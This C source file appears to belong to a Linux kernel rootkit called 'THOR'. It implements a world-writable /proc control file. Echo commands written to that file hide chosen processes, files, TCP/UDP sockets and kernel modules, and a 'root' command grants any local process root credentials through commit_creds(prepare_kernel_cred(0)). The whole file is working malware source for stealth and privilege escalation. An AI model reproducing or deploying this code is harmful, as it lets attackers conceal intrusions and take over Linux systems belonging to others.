#include "procfile.h"

#include "config.h"
#include "filehider.h"
#include "helper.h"
#include "logging.h"
#include "lsmodhider.h"
#include "pidhider.h"
#include "sockethider.h"

#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <linux/version.h>

/* function prototypes */
static int procfile_read(struct seq_file *m, void *v);
static int procfile_open(struct inode *inode, struct file *file);
static ssize_t procfile_write(struct file *file, const char __user *buffer,
        size_t count, loff_t *ppos);

/* procfile */
struct proc_dir_entry *procfile;

/* file operatiosn for procfile */
static struct file_operations procfile_fops = {
    .owner = THIS_MODULE,
    .open = procfile_open,
    .read = seq_read,
    .write = procfile_write,
    .llseek = seq_lseek,
    .release = single_release,
};

int procfile_init(void)
{
    LOG_INFO("creating /proc/" THOR_PROCFILE);

    /* allocate file in proc */
    procfile = proc_create(THOR_PROCFILE, 0666, NULL, &procfile_fops);
    if (procfile == NULL) {
        LOG_ERROR("could not create proc entry");
        return -1;
    }

    return 0;
}

/* read callback for procfile */
static int procfile_read(struct seq_file *m, void *v)
{
    seq_printf(m, "usage:\n");
    seq_printf(m, "   echo hp PID    > /proc/" THOR_PROCFILE " (hides process PID)\n");
    seq_printf(m, "   echo up PID    > /proc/" THOR_PROCFILE " (unhides process PID)\n");
    seq_printf(m, "   echo upa       > /proc/" THOR_PROCFILE " (unhide all PIDs)\n");
    seq_printf(m, "   echo hf FILE   > /proc/" THOR_PROCFILE " (hide file FILE)\n");
    seq_printf(m, "   echo uf FILE   > /proc/" THOR_PROCFILE " (unhide file FILE)\n");
    seq_printf(m, "   echo ufa       > /proc/" THOR_PROCFILE " (unhide all files)\n");
    seq_printf(m, "   echo ht4s PORT > /proc/" THOR_PROCFILE " (hide tcp4 socket)\n");
    seq_printf(m, "   echo ut4s PORT > /proc/" THOR_PROCFILE " (unhide tcp4 socket)\n");
    seq_printf(m, "   echo ht6s PORT > /proc/" THOR_PROCFILE " (hide tcp6 socket)\n");
    seq_printf(m, "   echo ut6s PORT > /proc/" THOR_PROCFILE " (unhide tcp6 socket)\n");
    seq_printf(m, "   echo hu4s PORT > /proc/" THOR_PROCFILE " (hide udp4 socket)\n");
    seq_printf(m, "   echo uu4s PORT > /proc/" THOR_PROCFILE " (unhide udp4 socket)\n");
    seq_printf(m, "   echo hu6s PORT > /proc/" THOR_PROCFILE " (hide udp6 socket)\n");
    seq_printf(m, "   echo uu6s PORT > /proc/" THOR_PROCFILE " (unhide udp6 socket)\n");
    seq_printf(m, "   echo usa       > /proc/" THOR_PROCFILE " (unhide all sockets)\n");
    seq_printf(m, "   echo hm MODULE > /proc/" THOR_PROCFILE " (hide module)\n");
    seq_printf(m, "   echo um MODULE > /proc/" THOR_PROCFILE " (unhide module)\n");
    seq_printf(m, "   echo uma       > /proc/" THOR_PROCFILE " (unhide all modules)\n");
    seq_printf(m, "   echo root      > /proc/" THOR_PROCFILE " (gain root privileges)\n");
    return 0;
}

/* open callback for procfile */
static int procfile_open(struct inode *inode, struct file *file)
{
    return single_open(file, procfile_read, NULL);
}

/* write callback for procfile */
static ssize_t procfile_write(struct file *file, const char __user *buffer,
        size_t count, loff_t *ppos)
{
    int r;
    if (strncmp(buffer, "hp ", MIN(3, count)) == 0) {
        int pid;
        char s_pid[6];
        strncpy(s_pid, buffer+3, MIN(6, count - 3));
        s_pid[MIN(6, count-3)-1] = 0;
        r = kstrtoint(s_pid, 10, &pid);
        if (r == 0) {
            add_to_pid_list((unsigned short) pid);
        } else {
            LOG_ERROR("kstrtoint failed to parse input: %s, error: %d", s_pid, r);
        }
    } else if (strncmp(buffer, "upa", MIN(3, count)) == 0) {
        clear_pid_list();
    } else if (strncmp(buffer, "up ", MIN(3, count)) == 0) {
        int pid;
        char s_pid[6];
        strncpy(s_pid, buffer+3, MIN(6, count - 3));
        s_pid[MIN(6, count-3)-1] = 0;
        r = kstrtoint(s_pid, 10, &pid);
        if (r == 0) {
            remove_from_pid_list((unsigned short) pid);
        } else {
            LOG_ERROR("kstrtoint failed to parse input: %s, error: %d", s_pid, r);
        }
    } else if (strncmp(buffer, "hf ", MIN(3, count)) == 0) {
        add_to_file_list(buffer + 3, count - 3);
    } else if (strncmp(buffer, "ufa", MIN(3, count)) == 0) {
        clear_file_list();
    } else if (strncmp(buffer, "uf ", MIN(3, count)) == 0) {
        remove_from_file_list(buffer + 3, count - 3);
    } else if (strncmp(buffer, "ht4s ", MIN(5, count)) == 0) {
        long port;
        char s_port[12];
        strncpy(s_port, buffer+5, MIN(12, count - 5));
        s_port[MIN(12, count-5)-1] = 0;
        r = kstrtol(s_port, 10, &port);
        if (r == 0) {
            add_to_socket_list((int) port, tcp4);
        } else {
            LOG_ERROR("kstrtoint failed to parse input: %s, error: %d", s_port, r);
        }
    } else if (strncmp(buffer, "ut4s ", MIN(5, count)) == 0) {
        long port;
        char s_port[12];
        strncpy(s_port, buffer+5, MIN(12, count - 5));
        s_port[MIN(12, count-5)-1] = 0;
        r = kstrtol(s_port, 10, &port);
        if (r == 0) {
            remove_from_socket_list((int) port, tcp4);
        } else {
            LOG_ERROR("kstrtoint failed to parse input: %s, error: %d", s_port, r);
        }
    } else if (strncmp(buffer, "ht6s ", MIN(5, count)) == 0) {
        long port;
        char s_port[12];
        strncpy(s_port, buffer+5, MIN(12, count - 5));
        s_port[MIN(12, count-5)-1] = 0;
        r = kstrtol(s_port, 10, &port);
        if (r == 0) {
            add_to_socket_list((int) port, tcp6);
        } else {
            LOG_ERROR("kstrtoint failed to parse input: %s, error: %d", s_port, r);
        }
    } else if (strncmp(buffer, "ut6s ", MIN(5, count)) == 0) {
        long port;
        char s_port[12];
        strncpy(s_port, buffer+5, MIN(12, count - 5));
        s_port[MIN(12, count-5)-1] = 0;
        r = kstrtol(s_port, 10, &port);
        if (r == 0) {
            remove_from_socket_list((int) port, tcp6);
        } else {
            LOG_ERROR("kstrtoint failed to parse input: %s, error: %d", s_port, r);
        }
    } else if (strncmp(buffer, "hu4s ", MIN(5, count)) == 0) {
        long port;
        char s_port[12];
        strncpy(s_port, buffer+5, MIN(12, count - 5));
        s_port[MIN(12, count-5)-1] = 0;
        r = kstrtol(s_port, 10, &port);
        if (r == 0) {
            add_to_socket_list((int) port, udp4);
        } else {
            LOG_ERROR("kstrtoint failed to parse input: %s, error: %d", s_port, r);
        }
    } else if (strncmp(buffer, "uu4s ", MIN(5, count)) == 0) {
        long port;
        char s_port[12];
        strncpy(s_port, buffer+5, MIN(12, count - 5));
        s_port[MIN(12, count-5)-1] = 0;
        r = kstrtol(s_port, 10, &port);
        if (r == 0) {
            remove_from_socket_list((int) port, udp4);
        } else {
            LOG_ERROR("kstrtoint failed to parse input: %s, error: %d", s_port, r);
        }
    } else if (strncmp(buffer, "hu6s ", MIN(5, count)) == 0) {
        long port;
        char s_port[12];
        strncpy(s_port, buffer+5, MIN(12, count - 5));
        s_port[MIN(12, count-5)-1] = 0;
        r = kstrtol(s_port, 10, &port);
        if (r == 0) {
            add_to_socket_list((int) port, udp6);
        } else {
            LOG_ERROR("kstrtoint failed to parse input: %s, error: %d", s_port, r);
        }
    } else if (strncmp(buffer, "uu6s ", MIN(5, count)) == 0) {
        long port;
        char s_port[12];
        strncpy(s_port, buffer+5, MIN(12, count - 5));
        s_port[MIN(12, count-5)-1] = 0;
        r = kstrtol(s_port, 10, &port);
        if (r == 0) {
            remove_from_socket_list((int) port, udp6);
        } else {
            LOG_ERROR("kstrtoint failed to parse input: %s, error: %d", s_port, r);
        }
    } else if (strncmp(buffer, "uu6a", MIN(4, count)) == 0) {
        clear_socket_list();
    } else if (strncmp(buffer, "hm ", MIN(3, count)) == 0) {
        add_to_module_list(buffer + 3, count - 3);
    } else if (strncmp(buffer, "uma", MIN(3, count)) == 0) {
        clear_module_list();
    } else if (strncmp(buffer, "um ", MIN(3, count)) == 0) {
        remove_from_module_list(buffer + 3, count - 3);
    } else if (strncmp(buffer, "root", MIN(4, count)) == 0) {
        commit_creds(prepare_kernel_cred(0));
    }
    return count;
}

void procfile_cleanup(void)
{
    if (procfile != NULL) {
        LOG_INFO("removing /proc/" THOR_PROCFILE);

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
        remove_proc_entry(THOR_PROCFILE, procfile->parent);
#else
        proc_remove(procfile);
#endif
        procfile = NULL;
    }
}